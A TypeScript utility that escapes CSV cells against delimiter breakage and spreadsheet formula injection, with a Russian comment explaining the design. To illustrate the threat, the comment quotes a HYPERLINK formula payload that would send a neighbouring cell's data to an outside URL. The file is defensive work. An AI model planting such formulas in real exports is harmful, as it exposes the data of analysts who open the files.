/**
 * Ячейка CSV для всех выгрузок: журнал, SPSS (data/long/codebook), сырая
 * выгрузка аналитики.
 *
 * Две заботы, и обе про того, кто откроет файл.
 *
 * 1. Разбор. Кавычка, запятая, точка с запятой (разделитель кодбука и
 *    русской локали Excel) и переносы строки ломают колонки — такая ячейка
 *    берётся в кавычки, внутренние кавычки удваиваются.
 *
 * 2. Формулы (ревью безопасности, P2). Ячейку, начинающуюся с «=», «+»,
 *    «-», «@», табуляции или возврата каретки, табличный редактор выполняет
 *    как формулу. Свободный ответ обследуемого приходит в выгрузку как есть,
 *    и `=HYPERLINK("http://…?"&A2;"Відкрити")` исполнился бы у аналитика в
 *    Excel — с его правами и его данными в соседних ячейках. Такая ячейка
 *    получает апостроф в начало: редактор показывает текст, а не считает.
 *    Прежде так делал только журнал (routes/audit.ts); SPSS и аналитика
 *    экранировали одни кавычки.
 *
 * Число — не формула. «-3» в колонке балла или код пропуска «-99» остаются
 * числами: апостроф превратил бы их в текст, и SPSS/R прочли бы колонку
 * строковой, а среднее по ней — не посчиталось бы. Поэтому исключение ровно
 * одно — строка, целиком являющаяся десятичным числом; «-1+2» числом не
 * является и апостроф получает.
 *
 * Цена честная: текстовая ячейка, законно начавшаяся с «-» («- не знаю»),
 * в файле тоже будет с апострофом. Исследователь увидит его и уберёт; обратный
 * выбор — формула у каждого, кто откроет файл двойным щелчком.
 */

const FORMULA_START = /^[=+\-@\t\r]/;
const PLAIN_NUMBER = /^-?\d+(\.\d+)?([eE][+-]?\d+)?$/;
const NEEDS_QUOTES = /[",;\n\r]/;

export function csvCell(value: unknown): string {
  let text =
    value === null || value === undefined
      ? ""
      : typeof value === "string"
        ? value
        : typeof value === "number" || typeof value === "boolean"
          ? String(value)
          : JSON.stringify(value);
  if (FORMULA_START.test(text) && !PLAIN_NUMBER.test(text)) text = `'${text}`;
  return NEEDS_QUOTES.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}
